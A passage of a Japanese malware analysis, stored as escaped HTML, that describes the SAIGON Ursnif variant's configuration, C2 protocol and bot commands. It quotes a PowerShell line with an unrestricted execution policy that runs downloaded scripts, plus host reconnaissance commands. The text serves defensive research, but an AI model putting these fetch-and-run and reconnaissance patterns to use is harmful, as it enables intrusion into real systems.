v3\u7d50\u5408\u30c7\u30fc\u30bf\u003Cbr\u003E\n\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u3053\u306e\u69cb\u9020\u4f53\u306f\u3001\u30d0\u30f3\u30c9\u30eb\u3055\u308c\u305f\u30d5\u30a1\u30a4\u30eb\u306e\u3055\u307e\u3056\u307e\u306a\u30d7\u30ed\u30d1\u30c6\u30a3\uff08offset\u3001size\u3001type\uff09\u3092\u5b9a\u7fa9\u3057\u307e\u3059\u3002\u3053\u308c\u306f\u3001SAIGON\u304c\u305d\u306e3\u3064\u306e\u57cb\u3081\u8fbc\u307f\u30d5\u30a1\u30a4\u30eb\u3092\u683c\u7d0d\u3059\u308b\u305f\u3081\u306b\u4f7f\u7528\u3059\u308b\u30e1\u30bd\u30c3\u30c9\u3068\u307e\u3063\u305f\u304f\u540c\u3058\u3067\u3059\u3002\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ci\u003EPUBLIC.KEY\uff1aRSA\u516c\u958b\u9375\u003C\/i\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Ci\u003ERUN.PS1\uff1a\u003C\/i\u003EPowerShell\u30b9\u30af\u30ea\u30d7\u30c8\u30fb\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u003C\/li\u003E\n\u003Cli\u003E\u003Ci\u003ELOADER.INI\uff1a\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u8a2d\u5b9a\u003C\/i\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u6b21\u306b\u3001\u78ba\u8a8d\u3055\u308c\u305f\u8a2d\u5b9a\u30aa\u30d7\u30b7\u30e7\u30f3\u306e\u30ea\u30b9\u30c8\u3092\u793a\u3057\u307e\u3059\u3002\u003C\/p\u003E\n\u003Ctable width=\u0022631\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u540d\u524d\u306e\u30c1\u30a7\u30c3\u30af\u30b5\u30e0\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u540d\u524d\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003E\u8aac\u660e\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x97ccd204\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EHostsList\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003E\u901a\u4fe1\u306b\u4f7f\u7528\u3055\u308c\u308bC2 URL\u306e\u4e00\u89a7\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0xd82bcb60\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EServerKey\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003EC2\u3068\u306e\u901a\u4fe1\u306b\u4f7f\u7528\u3055\u308c\u308bSerpent\u30ad\u30fc\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x23a02904\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EGroup\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003E\u30dc\u30c3\u30c8\u30cd\u30c3\u30c8ID\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x776c71c0\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EIdlePeriod\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003EC2\u3078\u306e\u6700\u521d\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u306e\u524d\u306b\u5f85\u6a5f\u3059\u308b\u79d2\u6570\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x22aa2818\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EMinimumUptime\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003E\u7a3c\u50cd\u6642\u9593\u304c\u3053\u306e\u6307\u5b9a\u5024\uff08\u79d2\u5358\u4f4d\uff09\u3088\u308a\u9577\u304f\u306a\u308b\u307e\u3067\u5f85\u6a5f\u3059\u308b\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x5beb543e\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003ELoadPeriod\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003EC2\u3078\u306e\u5f8c\u7d9a\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u9593\u306e\u5f85\u6a5f\u79d2\u6570\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022103\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x84485ef2\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022134\u0022\u003E\u003Cp\u003E\u003Ci\u003EHostKeepTime\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022394\u0022\u003E\u003Cp\u003E\u969c\u5bb3\u767a\u751f\u6642\u306b\u6b21\u306eC2\u30b5\u30fc\u30d0\u30fc\u306b\u5207\u308a\u66ff\u3048\u308b\u307e\u3067\u306e\u5f85\u6a5f\u6642\u9593\uff08\u5206\uff09\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003E\u88681\uff1a\u8a2d\u5b9a\u30aa\u30d7\u30b7\u30e7\u30f3\u003Cbr\u003E\n\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003E\u901a\u4fe1\u003Cbr\u003E\n\u003C\/h5\u003E\n\u003Cp\u003ESAIGON\u306e\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u901a\u4fe1\u306e\u69cb\u9020\u4f53\u306f\u3001\u5c11\u3057\u306e\u9055\u3044\u306f\u3042\u3063\u3066\u3082\u3001Ursnif v3\u3068\u975e\u5e38\u306b\u4f3c\u3066\u3044\u307e\u3059\u3002SAIGON\u30d3\u30fc\u30b3\u30f3\u306f\u3001\u300c\u003Ci\u003E\/index.html\u300d\u003C\/i\u003E URL\u30d1\u30b9\u306b\u5bfe\u3057\u3001HTTP POST\u3067multipart\/form-data\u30a8\u30f3\u30b3\u30fc\u30c9\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u3068\u3057\u3066C2\u30b5\u30fc\u30d0\u30fc\u306b\u9001\u4fe1\u3055\u308c\u307e\u3059\u3002\u9001\u4fe1\u3055\u308c\u308b\u30da\u30a4\u30ed\u30fc\u30c9\u306f\u3001\u6700\u521d\u306bSerpent\u6697\u53f7\uff08ECB\u30e2\u30fc\u30c9\u5bfeCBC\u30e2\u30fc\u30c9\uff09\u3092\u4f7f\u7528\u3057\u3066\u6697\u53f7\u5316\u3055\u308c\u3001\u6b21\u306bBase64\u30a8\u30f3\u30b3\u30fc\u30c9\u3055\u308c\u307e\u3059\u3002\u30b5\u30fc\u30d0\u30fc\u304b\u3089\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u306f\u3001\u540c\u3058Serpent\u30ad\u30fc\u3067\u6697\u53f7\u5316\u3055\u308c\u3001\u30b5\u30fc\u30d0\u30fc\u306eRSA\u79d8\u5bc6\u30ad\u30fc\u3067\u7f72\u540d\u3055\u308c\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cp\u003ESAIGON\u306f\u3001HTTP\u30ea\u30af\u30a8\u30b9\u30c8\u3067\u4ee5\u4e0b\u306eUser-Agent\u30d8\u30c3\u30c0\u30fc\u3092\u4f7f\u7528\u3057\u307e\u3059\uff1a\u003Ci\u003EMozilla\/5.0 (Windows NT\u0026lt;os_version\u0026gt;; rv:58.0) Gecko\/20100101 Firefox\/58.0\u003C\/i\u003E\u3002\u0026lt;os_version\u0026gt;\u306f\u3001OS\u306e\u30e1\u30b8\u30e3\u30fc\u3068\u30de\u30a4\u30ca\u30fc\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u756a\u53f7\uff08Windows10\u306e\u5834\u5408\u306f10.0\u3001Windows7\u306e\u5834\u5408\u306f6.1\uff09\u300164\u30d3\u30c3\u30c8OS\u306e\u5834\u5408\u306f\u3001\u6587\u5b57\u5217\u300c; Win64; x64\u300d\u304c\u8ffd\u52a0\u3055\u308c\u307e\u3059\u3002\u3053\u308c\u306b\u3088\u308a\u3001\u4ee5\u4e0b\u306e\u4f8b\u306eUser Agent\u6587\u5b57\u5217\u304c\u751f\u6210\u3055\u308c\u307e\u3059\u3002\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ci\u003EMozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko\/20100101 Firefox\/58.0\u003C\/i\u003E\uff0864\u30d3\u30c3\u30c8Windows 10\u306e\u5834\u5408\uff09\u003C\/li\u003E\n\u003Cli\u003E\u003Ci\u003EMozilla\/5.0 (Windows NT 6.1; rv:58.0) Gecko\/20100101 Firefox\/58.0\u003C\/i\u003E\uff0832\u30d3\u30c3\u30c8Windows 7\u306e\u5834\u5408\uff09\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u30ea\u30af\u30a8\u30b9\u30c8\u30fb\u30d5\u30a9\u30fc\u30de\u30c3\u30c8\u3082\u307e\u305f\u3001\u88682\u3067\u8aac\u660e\u3059\u308b\u3001\u4ed6\u306eUrsnif\u4e9c\u7a2e\u3067\u4f7f\u7528\u3055\u308c\u3066\u3044\u308b\u30d5\u30a9\u30fc\u30de\u30c3\u30c8\u3068\u5c11\u3057\u4f3c\u3066\u3044\u307e\u3059\u3002\u003C\/p\u003E\n\u003Ctable cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ever=%u\u0026amp;group=%u\u0026amp;id=%08x%08x%08x%08x\u0026amp;type=%u\u0026amp;uptime=%u\u0026amp;knock=%u\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ctable width=\u0022631\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u540d\u524d\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Cbr\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003E\u8aac\u660e\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Cbr\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Ever\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003E\u30dc\u30c3\u30c8\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\uff08\u4ed6\u306eUrsnif\u4e9c\u7a2e\u3068\u306f\u7570\u306a\u308a\u3001\u30d3\u30eb\u30c9\u756a\u53f7\u3092\u542b\u3080\u3060\u3051\u3002\u300c3.5.xxx\u300d\u306exxx\u306e\u6570\u5b57\u306e\u307f\uff09\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Egroup\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003E\u30dc\u30c3\u30c8\u30cd\u30c3\u30c8ID\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Eid\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003E\u30af\u30e9\u30a4\u30a2\u30f3\u30c8ID\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Etype\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003E\u30ea\u30af\u30a8\u30b9\u30c8\u30fb\u30bf\u30a4\u30d7\uff080\uff1a\u30bf\u30b9\u30af\u306e\u30dd\u30fc\u30ea\u30f3\u30b0\u6642\u30016\uff1a\u30b7\u30b9\u30c6\u30e0\u60c5\u5831\u30c7\u30fc\u30bf\u306e\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u6642\uff09\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Euptime\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003E\u30de\u30b7\u30f3\u306e\u7a3c\u50cd\u6642\u9593\uff08\u79d2\u5358\u4f4d\uff09\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002269\u0022\u003E\u003Cp\u003E\u003Ci\u003Eknock\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022562\u0022\u003E\u003Cp\u003E\u30dc\u30c3\u30c8\u306e\u300c\u30ce\u30c3\u30af\u300d\u671f\u9593\uff08C2\u3078\u306e\u5f8c\u7d9a\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u9593\u306e\u5f85\u6a5f\u79d2\u6570\u3002LoadPeriod\u8a2d\u5b9a\u30aa\u30d7\u30b7\u30e7\u30f3\u3092\u53c2\u7167\uff09\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003E\u88682\uff1a\u30ea\u30af\u30a8\u30b9\u30c8\u30fb\u30d5\u30a9\u30fc\u30de\u30c3\u30c8\u306e\u69cb\u6210\u8981\u7d20\u003Cbr\u003E\n\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003E\u6a5f\u80fd\u003Cbr\u003E\n\u003C\/h5\u003E\n\u003Cp\u003ESAIGON\u306f\u3001\u88683\u3067\u8aac\u660e\u3059\u308bbot\u30b3\u30de\u30f3\u30c9\u3092\u5b9f\u88c5\u3057\u307e\u3059\u3002\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Ctable width=\u0022631\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u540d\u524d\u306e\u30c1\u30a7\u30c3\u30af\u30b5\u30e0\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u540d\u524d\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003E\u8aac\u660e\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x45d4bf54\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003ESELF_DELETE\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u30de\u30b7\u30f3\u304b\u3089\u81ea\u8eab\u3092\u30a2\u30f3\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3059\u308b\u3002\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u3055\u308c\u305f\u30bf\u30b9\u30af\u3092\u524a\u9664\u3057\u3001\u30ec\u30b8\u30b9\u30c8\u30ea\u30fb\u30ad\u30fc\u3092\u524a\u9664\u3059\u308b\u003Cbr\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0xd86c3bdc\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003ELOAD_UPDATE\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003EURL\u304b\u3089\u30c7\u30fc\u30bf\u3092\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3057\u3001\u7f72\u540d\u3092\u5fa9\u53f7\u3057\u3066\u78ba\u8a8d\u3057\u3001.ps1\u3068\u3057\u3066\u4fdd\u5b58\u3057\u3066\u3001\u300cPowerShell.exe -ep unrestricted -file %s\u300d\u3092\u4f7f\u7528\u3057\u3066\u5b9f\u884c\u3059\u308b\u3002\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0xeac44e42\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003EGET_SYSINFO\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003E\u4ee5\u4e0b\u3092\u5b9f\u884c\u3057\u3066\u30b7\u30b9\u30c6\u30e0\u60c5\u5831\u3092\u53ce\u96c6\u3057\u3001\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3059\u308b\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Esysteminfo.exe\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Enet view\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Enslookup 127.0.0.1\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Etasklist.exe \/SVC\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Edriverquery.exe\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;\u003Ci\u003Ereg.exe query \u003C\/i\u003E\u0026quot;\u003Ci\u003EHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\u003C\/i\u003E\u0026quot;\u003Ci\u003E \/s\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x83bf8ea0\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003ELOAD_DLL\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003EURL\u304b\u3089\u30c7\u30fc\u30bf\u3092\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3057\u3001\u5fa9\u53f7\u3057\u3066\u78ba\u8a8d\u3057\u3001\u30e1\u30e2\u30ea\u306b\u81ea\u8eab\u3092\u30ed\u30fc\u30c9\u3059\u308b\u306e\u306b\u4f7f\u7528\u3057\u305f\u306e\u3068\u540c\u3058\u30b7\u30a7\u30eb\u30b3\u30fc\u30c9\u30fb\u30ed\u30fc\u30c0\u30fc\u3092\u4f7f\u7528\u3057\u3066\u3001DLL\u3092\u73fe\u884c\u30d7\u30ed\u30bb\u30b9\u306b\u30ed\u30fc\u30c9\u3059\u308b\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0xa8e78c43\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003ELOAD_EXE\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003EURL\u304b\u3089\u30c7\u30fc\u30bf\u3092\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3057\u3001\u5fa9\u53f7\u3057\u3066\u78ba\u8a8d\u3057\u3001.exe\u62e1\u5f35\u5b50\u3092\u4ed8\u3051\u3066\u4fdd\u5b58\u3057\u3001ShellExecute\u3092\u4f7f\u7528\u3057\u3066\u547c\u3073\u51fa\u3059\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003E\u88683\uff1aSAIGON\u30dc\u30c3\u30c8\u30fb\u30b3\u30de\u30f3\u30c9\u003Cbr\u003E\n\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003EUrsnif v3\u3068\u306e\u6bd4\u8f03\u003Cbr\u003E\n\u003C\/h5\u003E\n\u003Cp\u003E\u88684\u306b\u3001Ursnif v3\u3068SAIGON\u306e\u89e3\u6790\u6e08\u307f\u30b5\u30f3\u30d7\u30eb\u306e\u985e\u4f3c\u70b9\u3092\u793a\u3057\u307e\u3059\uff08\u003Cb\u003E\u592a\u5b57\u003C\/b\u003E\u306f\u7570\u306a\u308b\u90e8\u5206\u3092\u8868\u3057\u307e\u3059\uff09\u3002\u003C\/p\u003E\n\u003Ctable width=\u0022631\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Cb\u003E\u0026nbsp;\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003EUrsnif v3 (RM3)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003ESaigon (Ursnif v3.5?)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u6301\u7d9a\u6027\u306e\u7dad\u6301\u306e\u624b\u6cd5\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Cbr\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u3055\u308c\u305f\u30bf\u30b9\u30af\u3002PowerShell\u3092\u4f7f\u7528\u3057\u3066\u30ec\u30b8\u30b9\u30c8\u30ea\u30fb\u30ad\u30fc\u306b\u683c\u7d0d\u3055\u308c\u305f\u30b3\u30fc\u30c9\u3092\u5b9f\u884c\u3059\u308b\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u3055\u308c\u305f\u30bf\u30b9\u30af\u3002PowerShell\u3092\u4f7f\u7528\u3057\u3066\u30ec\u30b8\u30b9\u30c8\u30ea\u30fb\u30ad\u30fc\u306b\u683c\u7d0d\u3055\u308c\u305f\u30b3\u30fc\u30c9\u3092\u5b9f\u884c\u3059\u308b\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u8a2d\u5b9a\u306e\u4fdd\u5b58\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Cbr\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ESecurity PE\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u3002\u0027WD\u0027\u30de\u30b8\u30c3\u30af\u30fb\u30d0\u30a4\u30c8\uff08Ursnif\u306e\u0026quot;joined files\u0026quot;\u3068\u3082\u547c\u3070\u308c\u308b)\u3067\u59cb\u307e\u308b\u57cb\u3081\u8fbc\u307f\u30d0\u30a4\u30ca\u30ea\u30fb\u30c7\u30fc\u30bf\u3092\u6307\u3059\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ESecurity PE\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u3002\u0027WD\u0027\u30de\u30b8\u30c3\u30af\u30fb\u30d0\u30a4\u30c8\uff08Ursnif\u306e\u0026quot;joined files\u0026quot;\u3068\u3082\u547c\u3070\u308c\u308b)\u3067\u59cb\u307e\u308b\u57cb\u3081\u8fbc\u307f\u30d0\u30a4\u30ca\u30ea\u30fb\u30c7\u30fc\u30bf\u3092\u6307\u3059\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EPRNG\u30a2\u30eb\u30b4\u30ea\u30ba\u30e0\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003Exorshift64*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003Exorshift64*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003E\u30c1\u30a7\u30c3\u30af\u30b5\u30e0\u30fb\u30a2\u30eb\u30b4\u30ea\u30ba\u30e0\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003EJAMCRC\uff08\u3059\u3079\u3066\u306e\u30d3\u30c3\u30c8\u3092\u53cd\u8ee2\u3057\u3066CRC32\u30c1\u30a7\u30c3\u30af\uff09\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003ECRC32\u30011\u30d3\u30c3\u30c8\u53f3\u30ed\u30fc\u30c6\u30fc\u30c8\u3057\u305f\u7d50\u679c\u3067\u30c1\u30a7\u30c3\u30af\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u30c7\u30fc\u30bf\u6bd4\u8f03\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EaPLib\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd 